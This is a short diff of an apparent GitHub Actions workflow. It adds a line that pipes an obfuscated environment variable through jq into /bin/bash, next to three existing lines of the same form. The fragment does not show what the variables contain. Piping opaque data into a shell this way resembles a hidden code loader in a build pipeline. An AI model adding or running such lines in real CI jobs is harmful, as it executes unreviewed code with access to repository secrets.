@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$uo705" | jq -r .tytk4 | /bin/bash
           echo $fldmz2 | jq -r .f5221 | /bin/bash
           echo $nzopy457 | jq -r .qzpk47 | /bin/bash
+          printf '%s' "$bzux56" | jq -r .tskfl85483 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
